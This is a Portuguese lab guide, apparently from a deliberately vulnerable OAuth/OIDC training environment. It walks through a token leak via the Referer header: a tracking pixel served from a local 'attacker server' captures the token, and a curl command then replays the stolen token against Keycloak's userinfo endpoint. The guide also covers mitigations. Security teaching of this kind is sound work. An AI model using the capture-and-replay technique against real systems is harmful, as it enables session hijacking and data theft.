# A-06 — Token Leakage via Referrer Header

## Descrição

Quando um access token OAuth 2.0 / OIDC é colocado como query parameter na URL
(ex: `/dashboard?token=eyJ...`), o browser inclui automaticamente essa URL completa
no header `Referer` quando carrega recursos externos (imagens, scripts, tracking pixels).

Um atacante que controle um servidor externo referenciado pela página recebe o token
sem qualquer interação da vítima.

---

## Pré-requisitos

- SP1 a correr em `http://localhost:5001`
- Attacker Server a correr em `http://localhost:9999`
- `VULN_A06_REFERRER_LEAK = True` em `sp1/config.py`

---

## Passos da Demonstração

### 1. Verificar configuração vulnerável

```python
# sp1/config.py
VULN_A06_REFERRER_LEAK = True   # ← deve estar True
```

### 2. Abrir o Attacker Dashboard

Abre `http://localhost:9999/` no browser — deixa esta aba aberta.

### 3. Fazer login no Portal A

Acede a `http://localhost:5001` e faz login com:
- **Username:** `alice`
- **Password:** `alice123`

### 4. Observar o token capturado

Após login, o SP1 redireciona para `/dashboard?token=eyJ...`.
A página carrega `<img src="http://localhost:9999/pixel.gif">`.
O browser envia automaticamente:

```
GET /pixel.gif HTTP/1.1
Host: localhost:9999
Referer: http://localhost:5001/dashboard?token=eyJhbGci...TRUNCADO
```

No Attacker Dashboard verás o evento **A-06** com o token completo.

### 5. Usar o token capturado (prova de exploração)

Copia o token do dashboard e faz um pedido directo à API do Keycloak:

```bash
TOKEN="eyJhbGci..."   # colar o token capturado

# Inspecionar o token (decode JWT)
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Chamar o userinfo endpoint do Keycloak com o token roubado
curl -s http://localhost:8080/realms/gid-lab/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

Resultado esperado: dados do utilizador (alice) devolvidos com sucesso — **o token é válido e foi roubado sem a alice saber**.

---

## Por que funciona?

1. O token está na **URL** (má prática — devia ficar apenas em memória/sessão)
2. O browser segue a **política de Referer por defeito**: envia a URL completa para recursos same-origin e cross-origin
3. O SP1 não define `Referrer-Policy: no-referrer` nos headers da resposta

---

## Mitigação (Passo 7)

```python
# sp1/config.py
VULN_A06_REFERRER_LEAK = False
```

Quando `False`, o SP1:
1. **Não coloca o token na URL** — usa apenas a sessão do servidor
2. **Adiciona o header** `Referrer-Policy: no-referrer` a todas as respostas
3. O pixel continua a ser carregado, mas o Referer chega vazio ao atacante

---

## Referências

- [OWASP — Token Leakage](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)
- [RFC 7636 — PKCE](https://datatracker.ietf.org/doc/html/rfc7636)
- [OAuth 2.0 Security BCP — Section 4.2.4](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#section-4.2.4)
